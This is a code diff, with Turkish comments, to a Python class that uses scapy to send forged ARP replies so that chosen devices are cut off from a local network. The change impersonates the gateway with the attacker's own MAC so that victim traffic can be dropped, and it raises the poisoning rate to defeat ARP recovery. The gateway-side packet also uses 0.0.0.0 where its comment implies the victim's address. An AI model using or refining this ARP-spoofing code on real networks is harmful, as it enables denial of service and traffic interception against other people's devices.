@@ -246,7 +246,7 @@ class Blocker:
     def _arp_poison_thread(self):
         """Banlanmış MAC adreslerini ağdan izole etmek için sürekli sahte ARP paketleri gönderir."""
         try:
-            from scapy.all import ARP, Ether, sendp
+            from scapy.all import ARP, Ether, sendp, get_if_hwaddr
             import logging
             logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
         except ImportError:
@@ -254,6 +254,12 @@ class Blocker:
             return
 
         while self.running:
+            try:
+                # Kendi MAC adresimizi sahte ağ geçidi olarak kullanıyoruz (Trafik bize gelsin ve iptables ile çöpe atılsın)
+                my_mac = get_if_hwaddr(self.interface)
+            except Exception:
+                my_mac = "02:00:00:00:00:00"
+
             if not self.gateway_ip or not self.blocked_macs:
                 time.sleep(2)
                 continue
@@ -265,15 +271,16 @@ class Blocker:
                 for mac in macs_to_poison:
                     if mac == self.gateway_mac:
                         continue
-                    # İki yönlü zehirleme (Bi-directional Poisoning)
-                    # 1. Kurbana "Modem benim (veya kara delik)" de
-                    pkt_to_victim = Ether(dst=mac)/ARP(op=2, psrc=self.gateway_ip, hwsrc="aa:bb:cc:dd:ee:ff", hwdst=mac)
-                    # 2. Modeme "Kurban benim (veya kara delik)" de
-                    pkt_to_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, psrc=mac, hwsrc="aa:bb:cc:dd:ee:ff", hwdst=self.gateway_mac)
+                    # Kurbana: Ağ geçidi benim (Trafik bana gelir ve iptables DROP eder)
+                    pkt_to_victim = Ether(dst=mac)/ARP(op=2, pdst="0.0.0.0", hwdst=mac, psrc=self.gateway_ip, hwsrc=my_mac)
+                    # Modeme: Kurban benim (Yanıtlar bana gelir)
+                    if self.gateway_mac:
+                        pkt_to_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc="0.0.0.0", hwsrc=my_mac)
+                        sendp(pkt_to_gateway, iface=self.interface, verbose=False)
                     
                     sendp(pkt_to_victim, iface=self.interface, verbose=False)
-                    sendp(pkt_to_gateway, iface=self.interface, verbose=False)
             except Exception:
                 pass
                 
-            time.sleep(1) # Her 1 saniyede bir zehirleme pakedi yolla
+            # ARP iyileşmesini önlemek için saldırı frekansını 0.5s'ye indirdik (v3.2)
+            time.sleep(0.5)
